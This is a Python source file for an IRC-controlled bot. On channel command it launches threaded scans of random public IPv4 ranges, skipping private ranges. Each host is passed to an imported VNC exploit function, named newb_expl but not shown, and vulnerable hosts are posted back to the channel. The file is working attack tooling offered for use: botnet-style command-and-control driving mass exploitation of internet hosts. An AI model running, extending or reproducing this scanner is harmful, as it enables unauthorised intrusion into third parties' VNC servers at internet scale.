from connection import Connection
from vnc_expl import newb_expl
from threading import Thread
import json
import random

class Bot:
	END_OF_MOTD = '376'
	PREFIX = 'v'
	TAG = '(vayne)'

	def __init__(self, nick):
		self.__connections = []
		self.__buffers = []
		self.__channels = []
		self.__threads = {}
		self.__key = 0
		self.__nick = nick

	def add_connection(self, sv, port):
		con = Connection(sv, port)
		self.__connections.append(con)
		self.__buffers.append('')

	def set_channels(self, channels):
		self.__channels = channels

	def connect(self):
		for con in self.__connections:
			if con.active:
				continue
			con.connect(self.__nick)
		self.work()
	
	@property
	def currcon(self):
		return self.__connections[self.__key]

	def printayne(self, msg, targets=None):
		self.currcon.msg('{0} ~ {1}'.format(self.TAG, msg), targets)

	def parse(self, data):
		print(data)
		source = ''
		line = ''
		if data.startswith(':'):
			source, line = data[1:].split(' ', 1)
		else:
			source = None
			p = data.split(' ')
			if p[0] == 'PING':
				self.currcon.write(('PONG', p[1]))
				print("PONG")
				return

		if ' :' in line:
			argstr, text = line.split(' :', 1)
		else:
			argstr, text = line, ''
		args = argstr.split(' ')

		if args[0] == self.END_OF_MOTD:
			for channel in self.__channels:
				self.currcon.write(('JOIN', channel))
			return	

		if text:
			if text[0] == self.PREFIX and len(text.split(' ')) >= 2:
				print('CMD!')
				self.parse_cmd(text)

	def check_args(self, args, req):
		if len(args) < req:
			self.printayne('?')
			return False
		return True

	def add_jobs(self, key, jobs):
		if key not in self.__threads:
			self.__threads[key] = []
		for job in jobs:	
			self.__threads[key].append(job)

	def parse_cmd(self, cmd):
		args = cmd[2:].split(' ')
		if len(args) > 1:
			cmd, args = cmd[2:].split(' ', 1)
		else:
			cmd = args[0]
			args = ''
		args = args.split(' ')

		if (cmd == 'join'):
			if not self.check_args(args, 1):
				return
			self.currcon.write(('JOIN', args[0]))
		if (cmd == 'vnc_newb'):
			if not self.check_args(args, 1):
				return
			self.vnc_newb_expl_div(args[0])
			self.printayne('5 jobs now exploiting the mask {0}'.format(args[0]), self.__channels)
		if (cmd == 'vnc_global'):
			t = Thread(target=self.vnc_global, args=(args[0] == 'clean',))
			t.start()
			self.add_jobs('vnc', [t])
			self.printayne('global vnc scan initialized', self.__channels)
		if (cmd == 'jobs'):
			ct = 0
			jobs = ''
			for k, v in self.__threads.iteritems():
				l = len(v)
				ct += l
				jobs += '{0}[{1}] '.format(k, l)
			self.printayne('currently running {0} jobs => {1}'.format(ct, jobs), self.__channels)
		if (cmd == 'stop'):
			if not self.check_args(args, 1):
				return
			if args[0] == 'all':
				self.__threads.clear()
				return
			if args[0] in self.__threads:
				del self.__threads[args[0]][:]

	def random_mask(self):
		r_first = random.randint(0, 255)
		r_second = random.randint(0, 255)
		mask = '{0}.{1}'.format(r_first, r_second)
		return [r_first, r_second, mask]

	def vnc_newb_expl(self, mask, b, e):
		for i in xrange(b, e):
			for j in range(256):
				if ('vnc' in self.__threads and not self.__threads['vnc']) or 'vnc' not in self.__threads:
					return
				host = '{0}.{1}.{2}'.format(mask, i, j)
				if newb_expl(host):
					self.printayne('vnc vulnerable => {0}'.format(host), self.__channels)

	def vnc_newb_expl_div(self, mask, join=False):
		threads = []
		for i in range(5):
			b = i * 51
			e = b + 51
			threads.append(Thread(target=self.vnc_newb_expl, args=(mask, b, e)))
		
		[t.start() for t in threads]
		self.add_jobs('vnc', threads)
		if join:
			[t.join() for t in threads]

	def vnc_global(self, clean):
		mask_done = []
		if not clean:
			vncd_f = open('vnc_done.json', 'r')
			vncd_j = json.load(vncd_f)
			vncd_f.close()
			mask_done = vncd_j['masks']
		r_first, r_second, mask = self.random_mask()
		while True:
			#subnetworks in 192.168.x.x or between 172.16 and 172.31 are private so no need for scanning
			while mask in mask_done or r_first == 10 or mask == '192.168' or (r_first == 172 and r_second >= 16 and r_second <= 31):
				r_first, r_second, mask = self.random_mask()
			self.vnc_newb_expl_div(mask, True)
			vncd_f = open('vnc_done.json', 'w')
			mask_done.append(mask)
			j = {'masks': mask_done}
			vncd_f.write(json.dumps(j))
			vncd_f.close()

	def work(self):
		while True:
			for key, con in enumerate(self.__connections):
				self.__buffers[self.__key] += con.socket.recv(1024)
				temp = self.__buffers[self.__key].split('\n')
				self.__buffers[self.__key] = temp.pop()
				
				for line in temp:
					clean = line.rstrip()
					self.__key = key
					self.parse(clean)

if __name__ == '__main__':
	"""
	bot = Bot('woodoozera')
	bot.add_connection('irc.freenode.org', 6667)
	bot.set_channels(['#woodoo'])
	bot.connect()
	"""
	bot = Bot('woodoozera')
	bot.vnc_global(True)
